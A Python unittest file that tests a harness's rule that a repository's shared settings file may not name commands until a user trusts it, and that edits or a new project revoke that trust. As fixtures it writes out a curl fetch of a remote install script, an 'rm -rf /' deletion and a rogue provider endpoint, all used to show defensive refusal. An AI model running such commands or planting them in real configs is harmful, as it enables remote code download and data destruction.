"""Saying that a settings file which came with a project is yours.

A settings file that travels with a repository can name the commands the
harness may run, so nothing reads those until somebody says the file is theirs.
That rule was right and there was no way to obey it: cloning a project whose
shared file named its own test command left three commands each pointing at the
next.

    harness qa run    ->  read the file, then run: harness trust
    harness trust     ->  there is no config.local.json, run harness init first
    harness init      ->  config already exists

These hold the way through open, and hold the rule itself shut.
"""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from our_harness.config import (
    is_project_shared_config_trusted,
    load_config,
    trust_project_local_config,
)
from our_harness.models import HarnessError


class SharedSettingsTestCase(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.base = Path(self.temporary.name).resolve()
        self.root = self.base / "project"
        (self.root / ".harness").mkdir(parents=True)
        self.shared = self.root / ".harness" / "config.json"
        self.store = self.base / "trusted.json"
        patched = patch("our_harness.config.project_trust_store_path", return_value=self.store)
        patched.start()
        self.addCleanup(patched.stop)

    def write_shared(self, commands: list[list[str]]) -> None:
        self.shared.write_text(
            json.dumps({"project": {"test_commands": commands}}), encoding="utf-8"
        )


class TheWayThroughTests(SharedSettingsTestCase):
    def test_a_shared_file_naming_commands_is_refused_until_it_is_trusted(self) -> None:
        self.write_shared([["python", "-m", "unittest"]])
        with self.assertRaises(HarnessError) as caught:
            load_config(self.root)
        self.assertIn("harness trust", str(caught.exception), "and it says what to do")

    def test_trusting_it_lets_the_commands_through(self) -> None:
        self.write_shared([["python", "-m", "unittest"]])
        trust_project_local_config(self.root, self.shared)
        config = load_config(self.root)
        self.assertEqual(config.get("project.test_commands"), [["python", "-m", "unittest"]])

    def test_changing_the_file_afterwards_makes_it_untrusted_again(self) -> None:
        # The whole point: trust is for the file somebody read, not for the
        # name of a file that can be changed under them afterwards.
        self.write_shared([["python", "-m", "unittest"]])
        trust_project_local_config(self.root, self.shared)
        self.assertTrue(is_project_shared_config_trusted(self.root))
        self.write_shared([["curl", "http://example.test/install.sh"]])
        self.assertFalse(is_project_shared_config_trusted(self.root))
        with self.assertRaises(HarnessError):
            load_config(self.root)

    def test_trusting_one_project_does_not_trust_another(self) -> None:
        self.write_shared([["python", "-m", "unittest"]])
        trust_project_local_config(self.root, self.shared)
        other = self.base / "other"
        (other / ".harness").mkdir(parents=True)
        (other / ".harness" / "config.json").write_text(
            self.shared.read_text(encoding="utf-8"), encoding="utf-8"
        )
        self.assertFalse(is_project_shared_config_trusted(other))
        with self.assertRaises(HarnessError):
            load_config(other)

    def test_nothing_is_trusted_before_anybody_says_so(self) -> None:
        self.write_shared([["python", "-m", "unittest"]])
        self.assertFalse(is_project_shared_config_trusted(self.root))

    def test_trusting_the_shared_file_keeps_the_local_one_trusted(self) -> None:
        # Two files, two answers, one record. Saying yes to one must not
        # quietly take back what was said about the other.
        local = self.root / ".harness" / "config.local.json"
        local.write_text(json.dumps({"project": {"lint_commands": [["ruff"]]}}), encoding="utf-8")
        self.write_shared([["python", "-m", "unittest"]])
        trust_project_local_config(self.root, local)
        trust_project_local_config(self.root, self.shared)
        config = load_config(self.root)
        self.assertEqual(config.get("project.test_commands"), [["python", "-m", "unittest"]])
        self.assertEqual(config.get("project.lint_commands"), [["ruff"]])


class TheRuleIsStillShutTests(SharedSettingsTestCase):
    """Trusting the file it names must not become trusting everything."""

    def test_an_untrusted_shared_file_still_cannot_name_commands(self) -> None:
        self.write_shared([["rm", "-rf", "/"]])
        with self.assertRaises(HarnessError):
            load_config(self.root)

    def test_trusting_the_shared_file_does_not_trust_a_local_one(self) -> None:
        self.write_shared([["python", "-m", "unittest"]])
        trust_project_local_config(self.root, self.shared)
        (self.root / ".harness" / "config.local.json").write_text(
            json.dumps({
                "providers": {
                    "sneaky": {
                        "kind": "openai-compatible",
                        "model": "anything",
                        "endpoint": "http://127.0.0.1:9911/v1",
                    }
                }
            }),
            encoding="utf-8",
        )
        with self.assertRaises(HarnessError) as caught:
            load_config(self.root)
        self.assertIn("harness trust", str(caught.exception))


if __name__ == "__main__":
    unittest.main()
